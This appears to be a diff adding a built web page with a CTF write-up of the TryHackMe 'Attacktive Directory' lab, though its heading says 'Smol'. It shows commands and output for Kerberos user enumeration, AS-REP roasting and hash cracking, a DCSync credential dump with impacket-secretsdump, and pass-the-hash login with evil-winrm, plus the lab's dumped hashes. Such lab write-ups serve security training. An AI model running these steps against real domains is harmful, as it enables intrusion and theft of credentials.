+    <span class="md-ellipsis">
+      
+        Submit the flags for each user account. They can be located on each user's desktop.
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Submit the flags for each user account. They can be located on each user&#39;s desktop.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#svc-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        svc-admin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        backup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#administrator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Administrator
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="tryhackme-smol">TryHackMe: Smol</h1>
+<h2 id="1-challenge-overview">1. Challenge Overview</h2>
+<ul>
+<li><strong>Name:</strong> Attacktive Directory</li>
+<li><strong>Difficulty:</strong> Medium</li>
+<li><strong>Category:</strong> AD</li>
+<li><strong>Description:</strong><br />
+  99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?</li>
+</ul>
+<h2 id="2-setup">2. Setup</h2>
+<p><strong><em><code>Impacket</code></em></strong> is a collection of Python classes for working with network protocols. It is a library that developers use to build security tools, but it also comes with a suite of ready-to-use scripts.</p>
+<ul>
+<li><strong>What it does:</strong> It allows you to "talk" to Windows systems using low-level protocols like SMB, MSRPC, and Kerberos without needing a Windows machine.</li>
+<li><strong>Common Use:</strong> If you have a password or a hash, you use Impacket scripts (like <code>psexec.py</code> or <code>wmiexec.py</code>) to remotely execute commands on a target, dump credentials (<code>secretsdump.py</code>), or manipulate Kerberos tickets.</li>
+</ul>
+<p><strong><em><code>BloodHound</code></em></strong> is an analytical tool (not a library) used to reveal the hidden, often complex relationships within an Active Directory environment.</p>
+<ul>
+<li><strong>What it does:</strong> It uses graph theory to map out how users, groups, computers, and permissions are connected. It answers the question: "I am a regular user; what is the shortest path of permissions I need to take to become a Domain Admin?"</li>
+<li><strong>Common Use:</strong> You run a "collector" (SharpHound) on a network to gather data, then you import that data into the BloodHound GUI to visualize attack paths like "User A is a member of Group B, which has Admin rights on Computer C, where a Domain Admin is logged in."</li>
+</ul>
+<p><strong><em><code>Neo4j</code></em></strong> is a graph database management system. It is the backend database that powers BloodHound.</p>
+<ul>
+<li><strong>What it does:</strong> Unlike a traditional spreadsheet-style database (SQL), Neo4j stores data as "Nodes" (entities like Users or Computers) and "Edges" (relationships like <code>MemberOf</code> or <code>HasSession</code>).</li>
+<li><strong>Common Use:</strong> You don't usually interact with Neo4j directly during a pentest; instead, you start the Neo4j service so that BloodHound has a place to store and quickly query the massive web of AD connections you've collected.</li>
+</ul>
+<h2 id="3-enumeration">3. Enumeration</h2>
+<p><strong>What is NetBIOS?</strong>
+NetBIOS (Network Basic Input/Output System) is a legacy service that allows applications on different computers to communicate over a local area network (LAN).</p>
+<p>Developed in the 1980s, it wasn't originally a routing protocol; it was just a way for computers to find each other by name (e.g., <code>OFFICE-PRINTER</code> or <code>DESKTOP-01</code>) rather than by an IP address.</p>
+<div class="highlight"><pre><span></span><code>nmap -sC -sV -p- -T4 --open 10.128.169.188
+
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 21:22 +0200
+Nmap scan report for 10.128.169.188
+Host is up (0.065s latency).
+Not shown: 62218 closed tcp ports (reset), 3291 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-30 19:23:21Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2026-03-29T19:21:40
+|_Not valid after:  2026-09-28T19:21:40
+|_ssl-date: 2026-03-30T19:24:23+00:00; 0s from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-03-30T19:24:13+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2026-03-30T19:24:16
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+</code></pre></div>
+<h3 id="31-what-tool-will-allow-us-to-enumerate-port-139445">3.1. What tool will allow us to enumerate port 139/445?</h3>
+<p><code>enum4linux / enum4linux-ng</code>
+This is a wrapper for the Samba tools and is the "go-to" for Linux-based testers targeting Windows/Samba.</p>
+<ul>
+<li><strong>Command:</strong> <code>enum4linux -a &lt;target&gt;</code></li>
+<li><strong>What it finds:</strong> Share names, password policies, group memberships, and OS information.</li>
+</ul>
+<h3 id="32-what-is-the-netbios-domain-name-of-the-machine">3.2. What is the NetBIOS-Domain Name of the machine?</h3>
+<p>NetBIOS_Domain_Name: <code>THM-AD</code></p>
+<h3 id="33-what-invalid-tld-top-level-domain-do-people-commonly-use-for-their-active-directory-domain">3.3. What invalid TLD (Top-Level Domain) do people commonly use for their Active Directory Domain?</h3>
+<p><code>.local</code></p>
+<h2 id="4-enumerating-users-using-kerberos">4. Enumerating Users using Kerberos</h2>
+<p><strong><em><code>Kerbrute</code></em></strong> is a specialized enumeration and brute-force tool that interacts with the Kerberos protocol (specifically the KDC - Key Distribution Center) rather than LDAP or SMB.</p>
+<h3 id="41-what-command-within-kerbrute-will-allow-us-to-enumerate-valid-usernames">4.1. What command within Kerbrute will allow us to enumerate valid usernames?</h3>
+<p>To enumerate valid usernames using Kerbrute, you use the <code>userenum</code> command.</p>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/1.png" /></p>
+<h3 id="42-what-notable-account-is-discovered-these-should-jump-out-at-you">4.2. What notable account is discovered? (These should jump out at you)</h3>
+<p><code>svc-admin</code></p>
+<h3 id="43-what-is-the-other-notable-account-is-discovered-these-should-jump-out-at-you">4.3. What is the other notable account is discovered? (These should jump out at you)</h3>
+<p><code>backup</code></p>
+<h2 id="5-abusing-kerberos">5. Abusing Kerberos</h2>
+<p><code>What is ASREPRoasting?</code>
+In a standard Kerberos login, Pre-Authentication is required. This means your computer sends a timestamp encrypted with your password hash to the Domain Controller (DC). The DC decrypts it to prove you are who you say you are before it sends you a Ticket Granting Ticket (TGT).</p>
+<p>However, if an account has the attribute "Do not require Kerberos preauthentication" (UF_DONT_REQUIRE_PREAUTH) enabled:</p>
+<ul>
+<li>You (the attacker) send a request (AS-REQ) for a ticket for that username.</li>
+<li>The DC says, "Sure, I don't need proof yet," and sends back an encrypted ticket (AS-REP).</li>
+<li>Part of that ticket is encrypted with the user's password hash. You can now take that "blob" of data home and use a tool like Hashcat or John the Ripper to guess the password until the math matches.</li>
+</ul>
+<h3 id="51-we-have-two-user-accounts-that-we-could-potentially-query-a-ticket-from-which-user-account-can-you-query-a-ticket-from-with-no-password">5.1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</h3>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/2.png" /></p>
+<p><code>svc-admin</code></p>
+<h3 id="52-looking-at-the-hashcat-examples-wiki-page-what-type-of-kerberos-hash-did-we-retrieve-from-the-kdc-specify-the-full-name">5.2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</h3>
+<p>Based on the Hashcat Examples Wiki and the <strong>$krb5asrep$23$</strong> prefix:
+<code>Kerberos 5 AS-REP etype 23</code></p>
+<h3 id="53-what-mode-is-the-hash">5.3. What mode is the hash?</h3>
+<p><code>18200</code></p>
+<h3 id="54-now-crack-the-hash-with-the-modified-password-list-provided-what-is-the-user-accounts-password">5.4. Now crack the hash with the modified password list provided, what is the user accounts password?</h3>
+<div class="highlight"><pre><span></span><code>hashcat -m 18200 hashes.txt Passwords.txt
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:215d2f9cf7788a19d7e8b5734612405c$1be16e0d291aba01071037b45de175c163a04b0a6c5ff66566dd420d491072d9ef5b0b3c8db72e9e27fe3c702679362ce3fbe1d67d09418ca0518bcb82a6adae1e4128ac75c2daafd7f2e325526e3044149ce6beb347011a6d1f82a08a0041d848cd740885227498ec878d931ee445fb400f73f71863bca63041f4e3272281d5897c489135d515bfb3aede46616ff4a715fdc06dd93afa9a8036d8f4fb9262189644d5982fc0c7d2995b5c309c8cbaa7789e2baf4f1426e15aedfbb8a4c4ef512614d7c1f67cccaed935b882f6c6e5eaa7805f9e2e8000be527b9600d964e6b88379cf4c28f663dd2d103dd3f9e1e02f3d61:management2005
+
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:215d2f9cf77...2f3d61
+Time.Started.....: Tue Mar 31 00:55:03 2026 (1 sec)
+Time.Estimated...: Tue Mar 31 00:55:04 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (Passwords.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........: 77723 H/s (2.88ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8192/70188 (11.67%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 4096/70188 (5.84%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: newzealand -&gt; whitey
+Hardware.Mon.#01.: Util: 60%
+</code></pre></div>
+<p>User accounts password:
+<code>management2005</code></p>
+<h2 id="6-back-to-the-basics">6. Back to the basics</h2>
+<h3 id="61-what-utility-can-we-use-to-map-remote-smb-shares">6.1. What utility can we use to map remote SMB shares?</h3>
+<p><code>smbclient</code></p>
+<h3 id="62-which-option-will-list-shares">6.2. Which option will list shares?</h3>
+<p><code>-L</code></p>
+<h3 id="63-how-many-remote-shares-is-the-server-listing">6.3. How many remote shares is the server listing?</h3>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/3.png" /></p>
+<p><code>6</code></p>
+<h3 id="64-there-is-one-particular-share-that-we-have-access-to-that-contains-a-text-file-which-share-is-it">6.4. There is one particular share that we have access to that contains a text file. Which share is it?</h3>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/4.png" />
+<img alt="Text Alt" src="../assets/attacktive-directory/5.png" /></p>
+<p><code>backup</code></p>
+<h3 id="65-what-is-the-content-of-the-file">6.5. What is the content of the file?</h3>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/6.png" /></p>
+<h3 id="66-decoding-the-contents-of-the-file-what-is-the-full-contents">6.6. Decoding the contents of the file, what is the full contents?</h3>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/7.png" /></p>
+<h2 id="7-elevating-privileges-within-the-domain">7. Elevating privileges within the domain</h2>
+<p><strong><code>What is DCSync?</code></strong>
+DCSync is a technique that mimics the behavior of a Domain Controller (DC). In a healthy Active Directory environment, DCs need to stay in sync with each other. They do this by "replicating" data—sharing updates about users, groups, and, most importantly, password hashes.</p>
+<p>An account like backup (in this lab) has been granted specific Replication Permissions. Because it has these rights, it can tell the main Domain Controller: "Hey, I'm a fellow DC. Please sync your database with me."</p>
+<p>The Domain Controller, believing the request is legitimate, sends over the requested objects, including the NTLM hashes of every single user in the domain.</p>
+<h3 id="71-what-method-allowed-us-to-dump-ntdsdit">7.1. What method allowed us to dump NTDS.DIT?</h3>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/8.png" /></p>
+<p><code>DRSUAPI</code> method</p>
+<p><code>DRSUAPI</code> stands for the <strong>Directory Replication Service Remote Protocol.</strong>
+It is the specific "language" that Windows Domain Controllers use to communicate with each other to keep their databases in sync. When you hear "DCSync," you are essentially hearing about the exploitation of this protocol.</p>
+<h3 id="72-what-is-the-administrators-ntlm-hash">7.2. What is the Administrators NTLM hash?</h3>
+<div class="highlight"><pre><span></span><code>impacket-secretsdump spookysec.local/backup:backup2517860@10.128.169.188
+</code></pre></div>
+<hr />
+<div class="highlight"><pre><span></span><code>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:d75a7a00362e08d751fc8a0e4fb77966:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
+Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
+Administrator:des-cbc-md5:2079ce0e5df189ad
+krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
+krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
+krbtgt:des-cbc-md5:b94f97e97fabbf5d
+spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
+spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
+spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
+spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
+spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
+spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
+spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
+spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
+spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
+spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
+spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
+spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
+spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
+spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
+spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
+spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
+spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
+spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
+spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
+spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
+spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
+spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
+spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
+spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
+spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
+spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
+spookysec.local\paradox:des-cbc-md5:83988983f8b34019
+spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
+spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
+spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
+spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
+spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
+spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
+spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
+spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
+spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
+spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
+spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
+spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
+spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
+spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
+spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
+ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:118922659bb846d3abb8227bcb0f3c22f03c2b59c4105c2ec1171da268431192
+ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:85776bea50eb7075c3fc890641f203f9
+ATTACKTIVEDIREC$:des-cbc-md5:a1a7f10d643132a8
+[*] Cleaning up...
+</code></pre></div>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<code>0e0363213e37b94221497260b0bcb4fc</code>:::</p>
+<h3 id="73-what-method-of-attack-could-allow-us-to-authenticate-as-the-user-without-the-password">7.3. What method of attack could allow us to authenticate as the user without the password?</h3>
+<p><strong><em><code>Pass-the-Hash</code></em></strong> (PtH) is a technique where you authenticate to a remote server using a captured NTLM hash instead of the plaintext password.<br />
+It works because the NTLM protocol uses the hash itself as the "secret" during the challenge-response handshake, so the server never needs to see the original password.<br />
+This allows you to bypass the cracking phase entirely and gain immediate access to systems.</p>
+<h3 id="74-using-a-tool-called-evil-winrm-what-option-will-allow-us-to-use-a-hash">7.4. Using a tool called Evil-WinRM what option will allow us to use a hash?</h3>
+<p><em><strong>evil-winrm</strong> -i 10.128.169.188 -u Administrator <code>-H</code> <THE_NTLM_HASH></em></p>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/9.png" /></p>
+<h2 id="8-flag-submission-panel">8. Flag Submission Panel</h2>
+<h3 id="submit-the-flags-for-each-user-account-they-can-be-located-on-each-users-desktop">Submit the flags for each user account. They can be located on each user's desktop.</h3>
+<h4 id="svc-admin">svc-admin</h4>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/10.png" /></p>
+<h4 id="backup">backup</h4>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/11.png" /></p>
+<h4 id="administrator">Administrator</h4>
+<p><img alt="Text Alt" src="../assets/attacktive-directory/12.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
